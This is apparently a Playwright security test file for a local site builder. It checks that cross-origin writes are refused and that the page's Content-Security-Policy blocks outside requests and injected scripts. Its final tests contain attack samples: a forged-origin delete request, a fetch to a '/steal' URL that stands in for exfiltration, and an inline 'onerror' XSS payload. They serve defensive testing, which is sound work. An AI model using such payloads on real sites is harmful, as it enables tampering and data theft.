import { test, expect } from "@playwright/test";

/**
 * Neuravex has no sign-in on purpose: it runs on your machine and the browser
 * that reaches it is yours. That holds for what you type in the address bar,
 * but not for the other tabs — any page on the web could post to
 * http://localhost:3000/api/… in the background, and these routes did as they
 * were told: delete a site, rewrite a page, empty the trash.
 */

const BASE = "http://127.0.0.1:3939";

test.describe("A request that changes something", () => {
  test("is refused when it comes from another site", async ({ request }) => {
    const site = await (await request.post("/api/sites", { data: { name: `Origin ${Date.now()}` } })).json();

    const res = await request.delete(`/api/sites/${site.id}?permanent=1`, {
      headers: { origin: "https://evil.example" },
    });
    expect(res.status()).toBe(403);

    // And the site it was after is still there.
    const still = await request.get(`/api/sites/${site.id}`);
    expect(still.ok()).toBe(true);

    await request.delete(`/api/sites/${site.id}?permanent=1`);
  });

  test("is carried out when it comes from this app", async ({ request }) => {
    const res = await request.post("/api/sites", {
      data: { name: `Origin ok ${Date.now()}` },
      headers: { origin: BASE },
    });
    expect(res.ok()).toBe(true);
    const site = await res.json();
    await request.delete(`/api/sites/${site.id}?permanent=1`);
  });

  test("is left alone when it did not come from a page at all", async ({ request }) => {
    // curl, a script, the test runner: no Origin to check, and no other site
    // able to cause one. That is you at a terminal.
    const res = await request.post("/api/sites", { data: { name: `Origin none ${Date.now()}` } });
    expect(res.ok()).toBe(true);
    const site = await res.json();
    await request.delete(`/api/sites/${site.id}?permanent=1`);
  });

  test("still reads happily from anywhere, since reading changes nothing", async ({ request }) => {
    const res = await request.get("/api/sites", { headers: { origin: "https://evil.example" } });
    expect(res.ok()).toBe(true);
  });
});

test.describe("The builder itself", () => {
  test("still saves, which is the thing the check must not break", async ({ page, request }) => {
    const site = await (await request.post("/api/sites", { data: { name: `Saves ${Date.now()}` } })).json();
    const pages = await (await request.get(`/api/sites/${site.id}/pages?all=1`)).json();
    await request.put(`/api/pages/${pages[0].id}/save`, {
      data: {
        published: true,
        content: [{ id: "a", type: "text", props: { text: "Before", align: "left", size: "base", color: "" } }],
      },
    });

    await page.goto(`/admin/sites/${site.id}/pages/${pages[0].id}`);
    await page.waitForSelector(".public-canvas");
    await page.locator(".public-canvas .inline-editable").first().click();
    await page.keyboard.type(" and after");
    await expect(page.locator("header span.text-xs").first()).toContainText("Saved", { timeout: 10000 });

    const saved = await (await request.get(`/api/pages/${pages[0].id}`)).json();
    expect(saved.content).toContain("and after");

    await request.delete(`/api/sites/${site.id}?permanent=1`);
  });
});

test.describe("What a page is allowed to load", () => {
  test("carries a policy that names the scripts by a number of the day", async ({ request }) => {
    const res = await request.get("/");
    const csp = res.headers()["content-security-policy"];
    expect(csp).toBeTruthy();

    const nonce = /'nonce-([^']+)'/.exec(csp!)?.[1];
    expect(nonce, "script-src should carry a nonce").toBeTruthy();

    // Next stamps the same number onto its own scripts. A <script> that
    // arrived inside somebody's content has no way to know it.
    const html = await res.text();
    expect(html).toContain(`nonce="${nonce}"`);

    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
    expect(csp).toContain("frame-ancestors 'self'");
  });

  test("gives every request a different number", async ({ request }) => {
    const nonceOf = async () =>
      /'nonce-([^']+)'/.exec((await request.get("/")).headers()["content-security-policy"]!)?.[1];
    expect(await nonceOf()).not.toBe(await nonceOf());
  });

  test("cannot talk to anywhere but this server", async ({ page }) => {
    await page.goto("/");
    await page.waitForTimeout(500);
    const result = await page.evaluate(async () => {
      try {
        await fetch("https://example.com/steal?x=1", { mode: "no-cors" });
        return "allowed";
      } catch {
        return "blocked";
      }
    });
    // Exfiltration is what a page quietly posting elsewhere looks like.
    expect(result).toBe("blocked");
  });

  test("will not run a handler that came in with the markup", async ({ page }) => {
    await page.goto("/");
    await page.waitForTimeout(500);
    const ran = await page.evaluate(() => {
      const host = document.createElement("div");
      host.innerHTML = '<img src=x onerror="window.__X=1">';
      document.body.appendChild(host);
      return new Promise((r) => setTimeout(() => r((window as unknown as { __X?: number }).__X === 1), 400));
    });
    expect(ran).toBe(false);
  });
});
